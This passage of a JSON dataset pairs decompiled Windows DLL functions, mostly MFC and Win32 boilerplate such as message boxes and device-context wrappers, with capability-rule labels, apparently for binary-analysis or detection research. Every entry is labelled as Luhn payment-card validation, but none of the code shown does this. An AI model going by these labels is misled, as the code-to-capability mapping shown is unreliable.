        "decompiled_code": "\nuint64_t fcn.18000ec04(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    ulong uStack16;\n    \n    uStack16 = 0;\n    iVar4 = fcn.180014058();\n    uVar5 = fcn.180013598(*(iVar4 + 0xd8), &uStack16);\n    iVar1 = uVar5;\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.USER32.dll_MessageBoxW)(arg1, arg2, arg3, arg4, 0);\n        uVar5 = uVar2;\n        if (iVar1 != 2) {\n            if (uVar2 != 0) {\n                uVar3 = 0;\n            }\n            else {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            fcn.18001357c(0, uStack16);\n            if (uVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_SetLastError)(uVar3);\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 281
    },
    "18000f01": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.18000f010(uint64_t arg1, uint64_t arg2, ulong arg3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int64_t *piVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    int64_t hModule;\n    int64_t iStackX32;\n    \n    arg1 = arg1 & 0xffffffff;\n    piVar5 = fcn.180012330();\n    if (piVar5 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar3 = swi(3);\n        uVar6 = (*pcVar3)();\n        return uVar6;\n    }\n    iVar7 = (**(*piVar5 + 0x18))(piVar5);\n    iStackX32 = iVar7 + 0x18;\n    hModule = fcn.18001231c(arg1);\n    iVar7 = iVar7 + 0x18;\n    if (hModule != 0) {\n        fcn.180008b80(&iStackX32, hModule, arg1);\n        iVar7 = iStackX32;\n    }\n    if (arg3 == 0xffffffff) {\n        arg3._0_4_ = arg1;\n    }\n    uVar4 = fcn.18000efb8(iVar7, arg2 & 0xffffffff, arg3);\n    LOCK();\n    piVar1 = iVar7 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(iVar7 + -0x18) + 8))();\n    }\n    return uVar4;\n}\n",
        "token_count": 403
    },
    "1800100b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.1800100b8(code **arg1)\n\n{\n    ulong *puVar1;\n    ulong in_R8;\n    ulong in_R9;\n    \n    *arg1 = vtable.CControlSiteFactoryMgr.0;\n    puVar1 = arg1[8];\n    if (puVar1 != NULL) {\n        (***puVar1)(puVar1, 1, in_R8, in_R9, 0xfffffffffffffffe);\n    }\n    fcn.18000fa8c(arg1 + 1);\n    arg1[1] = vtable.CList_class_IControlSiteFactory____ptr64__class_IControlSiteFactory____ptr64_.0;\n    for (puVar1 = arg1[2]; puVar1 != NULL; puVar1 = *puVar1) {\n    }\n    arg1[4] = NULL;\n    arg1[5] = NULL;\n    arg1[3] = NULL;\n    arg1[2] = NULL;\n    fcn.18002a100(arg1[6]);\n    arg1[6] = NULL;\n    return;\n}\n",
        "token_count": 239
    },
    "18001021": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180010210(code **arg1)\n\n{\n    code **arg2;\n    \n    *arg1 = vtable.CControlSiteFactoryMgr.0;\n    arg1[1] = vtable.CList_class_IControlSiteFactory____ptr64__class_IControlSiteFactory____ptr64_.0;\n    arg1[4] = NULL;\n    arg1[5] = NULL;\n    arg1[3] = NULL;\n    arg1[2] = NULL;\n    arg1[6] = NULL;\n    arg1[7] = 0xa;\n    arg2 = fcn.180009660(8);\n    if (arg2 == NULL) {\n        arg2 = NULL;\n    }\n    else {\n        *arg2 = vtable.COleControlSiteFactory.0;\n    }\n    arg1[8] = arg2;\n    fcn.180010110(arg1, arg2);\n    return arg1;\n}\n",
        "token_count": 203
    },
    "180010bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180010bc4(code **arg1)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = vtable.CWinThread.0;\n    if (arg1[0xb] != NULL) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    }\n    iVar1 = fcn.1800140a8();\n    if (*(iVar1 + 8) == arg1) {\n        *(iVar1 + 8) = 0;\n    }\n    if (arg1[4] != NULL) {\n        (**(arg1[4] + 0x38))();\n    }\n    arg1[7] = NULL;\n    return;\n}\n",
        "token_count": 146
    },
    "18001125": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.18001125c(int64_t arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    \n    if (arg2 < 1) {\n        iVar5 = *(arg1 + 0x40);\n        if (((iVar5 != 0) && (*(iVar5 + 0x40) != 0)) && (iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(),  iVar2 != 0))\n        {\n            fcn.1800185f4(iVar5, *(iVar5 + 0x40), 0x363, 1);\n            fcn.180018a08(*(iVar5 + 0x40), 0x363, 1, 0);\n        }\n        iVar3 = fcn.180014058();\n        iVar3 = fcn.180028cec(iVar3 + 0xc0, 0x18000dd78);\n        if (iVar3 == 0) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n        for (iVar3 = *(iVar3 + 0x10); iVar3 != 0; iVar3 = *(iVar3 + 200)) {\n            if ((*(iVar3 + 0x40) != 0) && (iVar3 != iVar5)) {\n                if (*(iVar3 + 0x120) == 0) {\n                    fcn.18001be78(iVar3, 0);\n                }\n                iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar3 + 0x40));\n                if ((iVar2 != 0) || (-1 < *(iVar3 + 0x120))) {\n                    fcn.1800185f4(iVar3, *(iVar3 + 0x40), 0x363, 1);\n                    fcn.180018a08(*(iVar3 + 0x40), 0x363, 1, 0);\n                }\n                if (0 < *(iVar3 + 0x120)) {\n                    fcn.18001be78(iVar3, *(iVar3 + 0x120));\n                }\n                *(iVar3 + 0x120) = 0xffffffff;\n            }\n        }\n    }\n    else {\n        iVar5 = fcn.180014058();\n        iVar5 = fcn.180028cec(iVar5 + 0xc0, 0x18000dd78);\n        if (iVar5 == 0) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n        if (*(iVar5 + 0x20) == 0) {\n            fcn.18002c630();\n            fcn.18002c8f8(1);\n        }\n    }\n    return arg2 < 1;\n}\n",
        "token_count": 669
    },
    "18001212": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180012128(ulong arg1, ulong hResData, ulong arg3, ulong arg4)\n\n{\n    ulong arg2;\n    \n    arg2 = (*_sym.imp.KERNEL32.dll_LockResource)(hResData);\n    fcn.1800120c4(arg1, arg2, arg3, 0);\n    return;\n}\n",
        "token_count": 78
    },
    "18002c71": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.18002c71c(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    ulong arg1_00;\n    int64_t iVar2;\n    int64_t *piVar3;\n    \n    if (arg2 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.18002d110(arg1 + 0x30, arg2);\n        if (iVar1 == 0) {\n            iVar1 = fcn.18002d110(arg1 + 0x68, arg2);\n            if (iVar1 == 0) {\n                arg1_00 = fcn.180009650(0x18001cc6c);\n                iVar1 = fcn.180030fb4(arg1 + 8);\n                iVar2 = iVar1;\n                if (iVar1 == 0) {\n                    iVar2 = fcn.1800124cc();\n                }\n                (**(arg1 + 0x20))(iVar2);\n                piVar3 = fcn.18002d358(arg1 + 0x68, arg2);\n                *piVar3 = iVar1;\n                fcn.180009650(arg1_00);\n                iVar2 = *(arg1 + 0xa8);\n                *(iVar1 + iVar2) = arg2;\n                if (*(arg1 + 0xb0) == 2) {\n                    *(iVar1 + 8 + iVar2) = arg2;\n                }\n            }\n            else {\n                iVar2 = *(arg1 + 0xa8);\n                *(iVar1 + iVar2) = arg2;\n                if (*(arg1 + 0xb0) == 2) {\n                    *(iVar1 + 8 + iVar2) = arg2;\n                }\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 402
    },
    "18001302": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180013020(code **arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    ulong arg2_00;\n    code *pcVar2;\n    \n    arg1[1] = NULL;\n    arg1[2] = NULL;\n    *(arg1 + 3) = 0;\n    *arg1 = vtable.CClientDC.0;\n    if (arg2 == 0) {\n        pcVar2 = NULL;\n    }\n    else {\n        pcVar2 = *(arg2 + 0x40);\n    }\n    arg1[4] = pcVar2;\n    arg2_00 = (*_sym.imp.USER32.dll_GetDC)();\n    iVar1 = fcn.180012f5c(arg1, arg2_00);\n    if (iVar1 == 0) {\n        fcn.1800127e0();\n    }\n    return arg1;\n}\n",
        "token_count": 199
    },
    "18001308": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180013084(code **arg1)\n\n{\n    ulong uVar1;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uVar2;\n    \n    uVar2 = 0xfffffffffffffffe;\n    *arg1 = vtable.CClientDC.0;\n    uVar1 = fcn.180012fa8(arg1);\n    (*_sym.imp.USER32.dll_ReleaseDC)(arg1[4], uVar1, in_R8, in_R9, uVar2);\n    *arg1 = vtable.CDC.0;\n    if (arg1[1] != NULL) {\n        uVar1 = fcn.180012fa8(arg1);\n        (*_sym.imp.GDI32.dll_DeleteDC)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "1800130c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.1800130c4(code **arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    ulong arg2_00;\n    code *pcVar2;\n    \n    arg1[1] = NULL;\n    arg1[2] = NULL;\n    *(arg1 + 3) = 0;\n    *arg1 = vtable.CWindowDC.0;\n    if (arg2 == 0) {\n        pcVar2 = NULL;\n    }\n    else {\n        pcVar2 = *(arg2 + 0x40);\n    }\n    arg1[4] = pcVar2;\n    arg2_00 = (*_sym.imp.USER32.dll_GetWindowDC)();\n    iVar1 = fcn.180012f5c(arg1, arg2_00);\n    if (iVar1 == 0) {\n        fcn.1800127e0();\n    }\n    return arg1;\n}\n",
        "token_count": 202
    },
    "18001312": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180013128(code **arg1)\n\n{\n    ulong uVar1;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uVar2;\n    \n    uVar2 = 0xfffffffffffffffe;\n    *arg1 = vtable.CWindowDC.0;\n    uVar1 = fcn.180012fa8(arg1);\n    (*_sym.imp.USER32.dll_ReleaseDC)(arg1[4], uVar1, in_R8, in_R9, uVar2);\n    *arg1 = vtable.CDC.0;\n    if (arg1[1] != NULL) {\n        uVar1 = fcn.180012fa8(arg1);\n        (*_sym.imp.GDI32.dll_DeleteDC)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "18001316": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180013168(code **arg1, int64_t hWnd)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ulong arg2;\n    ulong in_R8;\n    ulong in_R9;\n    \n    arg1[1] = NULL;\n    arg1[2] = NULL;\n    *(arg1 + 3) = 0;\n    *arg1 = vtable.CPaintDC.0;\n    pcVar1 = *(hWnd + 0x40);\n    arg1[4] = pcVar1;\n    arg2 = (*_sym.imp.USER32.dll_BeginPaint)(pcVar1, arg1 + 5, in_R8, in_R9, 0xfffffffffffffffe);\n    iVar2 = fcn.180012f5c(arg1, arg2);\n    if (iVar2 == 0) {\n        fcn.1800127e0();\n    }\n    return arg1;\n}\n",
        "token_count": 204
    },
    "1800131c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.1800131c8(code **lpPaint)\n\n{\n    ulong uVar1;\n    ulong in_R8;\n    ulong in_R9;\n    \n    *lpPaint = vtable.CPaintDC.0;\n    (*_sym.imp.USER32.dll_EndPaint)(lpPaint[4], lpPaint + 5, in_R8, in_R9, 0xfffffffffffffffe);\n    fcn.180012fa8(lpPaint);\n    *lpPaint = vtable.CDC.0;\n    if (lpPaint[1] != NULL) {\n        uVar1 = fcn.180012fa8(lpPaint);\n        (*_sym.imp.GDI32.dll_DeleteDC)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "18001384": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18001384c(code **arg1, ulong noname_1, ulong pv)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    ulong *puVar4;\n    code *pcVar5;\n    ulong in_R9;\n    \n    *arg1 = vtable.AFX_MODULE_STATE.0;\n    piVar3 = arg1[0x17];\n    if (piVar3 != NULL) {\n        (**(*piVar3 + 0x18))(piVar3, arg1 + 0x10, pv, in_R9, 0xfffffffffffffffe);\n        piVar3 = arg1[0x17];\n        if (piVar3 != NULL) {\n            (**(*piVar3 + 8))(piVar3, 1);\n        }\n    }\n    puVar4 = *arg1[0x19];\n    if (puVar4 != NULL) {\n        (***puVar4)(puVar4, 1);\n    }\n    puVar4 = *(arg1[0x19] + 8);\n    if (puVar4 != NULL) {\n        (***puVar4)(puVar4, 1);\n    }\n    fcn.1800096a4(arg1[0x19]);\n    if ((arg1[0x1b] != NULL) && (arg1[0x1b] != 0xffffffffffffffff)) {\n        if (*0x180069bd8 != NULL) {\n            (**0x180069bd8)();\n        }\n        arg1[0x1b] = 0xffffffffffffffff;\n    }\n    fcn.180028da8(arg1 + 0x18);\n    pcVar5 = arg1[0xb];\n    LOCK();\n    piVar1 = pcVar5 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar5 + -0x18) + 8))();\n    }\n    return;\n}\n",
        "token_count": 457
    },
    "18001396": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180013968(code **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iStackX8;\n    \n    fcn.1800087c4(&iStackX8, L\"comctl32.dll\");\n    *arg1 = vtable.CDllIsolationWrapperBase.0;\n    iVar3 = fcn.180008f18(iStackX8 + -0x18);\n    arg1[3] = iVar3 + 0x18;\n    arg1[1] = NULL;\n    *(arg1 + 2) = 0;\n    LOCK();\n    piVar1 = iStackX8 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(iStackX8 + -0x18) + 8))();\n    }\n    *arg1 = vtable.CComCtlWrapper.0;\n    arg1[4] = NULL;\n    arg1[5] = NULL;\n    arg1[6] = NULL;\n    arg1[7] = NULL;\n    arg1[8] = NULL;\n    arg1[9] = NULL;\n    arg1[10] = NULL;\n    arg1[0xb] = NULL;\n    arg1[0xc] = NULL;\n    arg1[0xd] = NULL;\n    arg1[0xe] = NULL;\n    arg1[0xf] = NULL;\n    arg1[0x10] = NULL;\n    arg1[0x11] = NULL;\n    arg1[0x12] = NULL;\n    arg1[0x13] = NULL;\n    arg1[0x14] = NULL;\n    arg1[0x15] = NULL;\n    arg1[0x16] = NULL;\n    arg1[0x17] = NULL;\n    arg1[0x18] = NULL;\n    arg1[0x19] = NULL;\n    arg1[0x1a] = NULL;\n    arg1[0x1b] = NULL;\n    arg1[0x1c] = NULL;\n    arg1[0x1d] = NULL;\n    arg1[0x1e] = NULL;\n    arg1[0x1f] = NULL;\n    arg1[0x20] = NULL;\n    arg1[0x21] = NULL;\n    arg1[0x22] = NULL;\n    arg1[0x23] = NULL;\n    arg1[0x24] = NULL;\n    arg1[0x25] = NULL;\n    arg1[0x26] = NULL;\n    arg1[0x27] = NULL;\n    arg1[0x28] = NULL;\n    arg1[0x29] = NULL;\n    arg1[0x2a] = NULL;\n    arg1[0x2b] = NULL;\n    arg1[0x2c] = NULL;\n    arg1[0x2d] = NULL;\n    arg1[0x2e] = NULL;\n    arg1[0x2f] = NULL;\n    arg1[0x30] = NULL;\n    arg1[0x31] = NULL;\n    arg1[0x32] = NULL;\n    arg1[0x33] = NULL;\n    arg1[0x34] = NULL;\n    arg1[0x35] = NULL;\n    arg1[0x36] = NULL;\n    arg1[0x37] = NULL;\n    arg1[0x38] = NULL;\n    arg1[0x39] = NULL;\n    arg1[0x3a] = NULL;\n    arg1[0x3b] = NULL;\n    arg1[0x3c] = NULL;\n    arg1[0x3d] = NULL;\n    arg1[0x3e] = NULL;\n    arg1[0x3f] = NULL;\n    arg1[0x40] = NULL;\n    arg1[0x41] = NULL;\n    arg1[0x42] = NULL;\n    arg1[0x43] = NULL;\n    arg1[0x44] = NULL;\n    arg1[0x45] = NULL;\n    arg1[0x46] = NULL;\n    arg1[0x47] = NULL;\n    arg1[0x48] = NULL;\n    arg1[0x49] = NULL;\n    arg1[0x4a] = NULL;\n    arg1[0x4b] = NULL;\n    arg1[0x4c] = NULL;\n    arg1[0x4d] = NULL;\n    arg1[0x4e] = NULL;\n    arg1[0x4f] = NULL;\n    arg1[0x50] = NULL;\n    arg1[0x51] = NULL;\n    arg1[0x52] = NULL;\n    arg1[0x53] = NULL;\n    arg1[0x54] = NULL;\n    arg1[0x55] = NULL;\n    arg1[0x56] = NULL;\n    arg1[0x57] = NULL;\n    arg1[0x58] = NULL;\n    arg1[0x59] = NULL;\n    arg1[0x5a] = NULL;\n    arg1[0x5b] = NULL;\n    arg1[0x5c] = NULL;\n    arg1[0x5d] = NULL;\n    arg1[0x5e] = NULL;\n    arg1[0x5f] = NULL;\n    arg1[0x60] = NULL;\n    arg1[0x61] = NULL;\n    return arg1;\n}\n",
        "token_count": 1281
    },
    "180013cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180013cc8(code **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iStackX8;\n    \n    fcn.1800087c4(&iStackX8, L\"comdlg32.dll\");\n    *arg1 = vtable.CDllIsolationWrapperBase.0;\n    iVar3 = fcn.180008f18(iStackX8 + -0x18);\n    arg1[3] = iVar3 + 0x18;\n    arg1[1] = NULL;\n    *(arg1 + 2) = 0;\n    LOCK();\n    piVar1 = iStackX8 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(iStackX8 + -0x18) + 8))();\n    }\n    *arg1 = vtable.CCommDlgWrapper.0;\n    arg1[4] = NULL;\n    arg1[5] = NULL;\n    arg1[6] = NULL;\n    arg1[7] = NULL;\n    arg1[8] = NULL;\n    arg1[9] = NULL;\n    arg1[10] = NULL;\n    arg1[0xb] = NULL;\n    arg1[0xc] = NULL;\n    arg1[0xd] = NULL;\n    arg1[0xe] = NULL;\n    arg1[0xf] = NULL;\n    arg1[0x10] = NULL;\n    arg1[0x11] = NULL;\n    arg1[0x12] = NULL;\n    arg1[0x13] = NULL;\n    arg1[0x14] = NULL;\n    arg1[0x15] = NULL;\n    arg1[0x16] = NULL;\n    arg1[0x17] = NULL;\n    arg1[0x18] = NULL;\n    return arg1;\n}\n",
        "token_count": 449
    },
    "180013dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180013dc4(code **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t aiStackX8 [4];\n    \n    fcn.1800087c4(aiStackX8, L\"shell32.dll\");\n    *arg1 = vtable.CDllIsolationWrapperBase.0;\n    iVar3 = fcn.180008f18(aiStackX8[0] + -0x18);\n    arg1[3] = iVar3 + 0x18;\n    arg1[1] = NULL;\n    *(arg1 + 2) = 0;\n    LOCK();\n    piVar1 = aiStackX8[0] + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(aiStackX8[0] + -0x18) + 8))();\n    }\n    *arg1 = vtable.CShellWrapper.0;\n    arg1[4] = NULL;\n    return arg1;\n}\n",
        "token_count": 254
    },
    "180013e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180013e4c(code **arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    code **ppcVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    ulong uVar5;\n    \n    *arg1 = vtable.AFX_MODULE_STATE.0;\n    arg1[6] = NULL;\n    arg1[7] = NULL;\n    arg1[8] = NULL;\n    arg1[9] = NULL;\n    piVar1 = fcn.180012330();\n    if (piVar1 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar4 = swi(3);\n        ppcVar2 = (*pcVar4)();\n        return ppcVar2;\n    }\n    iVar3 = (**(*piVar1 + 0x18))(piVar1);\n    arg1[0xb] = iVar3 + 0x18;\n    arg1[0xe] = NULL;\n    arg1[0xf] = NULL;\n    *(arg1 + 0x11) = 0xffffffff;\n    arg1[0x12] = NULL;\n    arg1[0x15] = NULL;\n    *(arg1 + 0x16) = 0;\n    arg1[9] = 0x40;\n    arg1[7] = 0x20;\n    *(arg1 + 0x2c) = 0;\n    *(arg1 + 5) = arg2;\n    if ((*(arg1[0xb] + -0xc) - 0x1000U | 1U - *(arg1[0xb] + -8)) < 0) {\n        fcn.180008ed0(arg1 + 0xb, 0x1000);\n    }\n    *(arg1 + 0x54) = 1;\n    arg1[0xf] = 0x20;\n    pcVar4 = fcn.180009660(0x18);\n    arg1[0x19] = pcVar4;\n    iVar3 = fcn.1800286bc(0x310);\n    if (iVar3 == 0) {\n        uVar5 = 0;\n    }\n    else {\n        uVar5 = fcn.180013968(iVar3);\n    }\n    *arg1[0x19] = uVar5;\n    iVar3 = fcn.1800286bc(200);\n    if (iVar3 == 0) {\n        uVar5 = 0;\n    }\n    else {\n        uVar5 = fcn.180013cc8(iVar3);\n    }\n    *(arg1[0x19] + 8) = uVar5;\n    iVar3 = fcn.1800286bc(0x28);\n    if (iVar3 == 0) {\n        uVar5 = 0;\n    }\n    else {\n        uVar5 = fcn.180013dc4(iVar3);\n    }\n    *(arg1[0x19] + 0x10) = uVar5;\n    *(arg1 + 0x1a) = 1;\n    arg1[0x1b] = NULL;\n    *(arg1 + 0x1c) = 0;\n    *(arg1 + 0xe4) = 0;\n    return arg1;\n}\n",
        "token_count": 736
    },
    "18001413": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180014130(ulong arg1)\n\n{\n    code *pcVar1;\n    code **arg1_00;\n    code **appcStackX16 [3];\n    \n    arg1_00 = fcn.180009660(0x18);\n    if (arg1_00 == NULL) {\n        arg1_00 = NULL;\n    }\n    else {\n        appcStackX16[0] = arg1_00;\n        fcn.180012538(arg1_00);\n        *arg1_00 = vtable.COleException.0;\n        *(arg1_00 + 2) = 0;\n    }\n    *(arg1_00 + 2) = arg1;\n    appcStackX16[0] = arg1_00;\n    fcn.180036174(appcStackX16, 0x180062b00);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 210
    },
    "180015b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint16_t fcn.180015b84(ulong arg1)\n\n{\n    int16_t iVar1;\n    int16_t extraout_AX;\n    int16_t extraout_AX_00;\n    uint extraout_EAX;\n    int32_t iVar2;\n    uint extraout_var;\n    uint uVar3;\n    ulong in_R8;\n    ulong in_R9;\n    bool bVar4;\n    ulong auStackX24 [2];\n    \n    auStackX24[0] = 0;\n    fcn.180014058();\n    iVar2 = fcn.180013598(*(CONCAT44(extraout_var, extraout_EAX) + 0xd8), auStackX24);\n    iVar1 = iVar2;\n    uVar3 = 0;\n    if ((iVar2 != 0) && (iVar1 = (*_sym.imp.USER32.dll_RegisterClassW)(arg1),  iVar2 != 2)) {\n        bVar4 = iVar1 == 0;\n        if (bVar4) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.18001357c(0, auStackX24[0], in_R8, in_R9, iVar1);\n        iVar1 = extraout_AX;\n        if (bVar4) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar3);\n            iVar1 = extraout_AX_00;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 319
    },
    "180015c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
